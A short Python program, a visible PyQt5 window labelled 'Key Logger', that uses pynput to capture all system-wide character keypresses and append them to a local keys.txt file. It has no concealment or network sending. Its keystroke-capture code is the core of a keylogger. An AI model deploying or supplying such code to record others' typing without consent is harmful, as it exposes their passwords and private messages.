from PyQt5.QtWidgets import *
from PyQt5.QtGui import *
from pynput import keyboard
from PyQt5.QtCore import QRect

class App(QWidget):
    def __init__(self):
        super().__init__()
        self.title = 'Key Logger'
        self.left = 50
        self.top = 50
        self.width = 300
        self.height = 200
        self.initUI()

    def initUI(self):
        self.setWindowTitle(self.title)
        self.setGeometry(self.left, self.top, self.width, self.height)

        self.button_start = QPushButton('Start', self)
        self.button_start.setGeometry(QRect(50, 50, 75, 30))
        self.button_start.clicked.connect(self.start_logging)

        self.button_stop = QPushButton('Stop', self)
        self.button_stop.setGeometry(QRect(150, 50, 75, 30))
        self.button_stop.setDisabled(True)
        self.button_stop.clicked.connect(self.stop_logging)

        self.show()

    def start_logging(self):
        self.button_start.setDisabled(True)
        self.button_stop.setDisabled(False)
        self.listener = keyboard.Listener(on_press=self.on_press)
        self.listener.start()

    def stop_logging(self):
        self.listener.stop()
        self.button_start.setDisabled(False)
        self.button_stop.setDisabled(True)

    def on_press(self, key):
        try:
            with open("keys.txt", "a") as f:
                f.write(str(key.char))
        except AttributeError:
            pass

if __name__ == '__main__':
    import sys
    app = QApplication(sys.argv)
    ex = App()
    sys.exit(app.exec_())

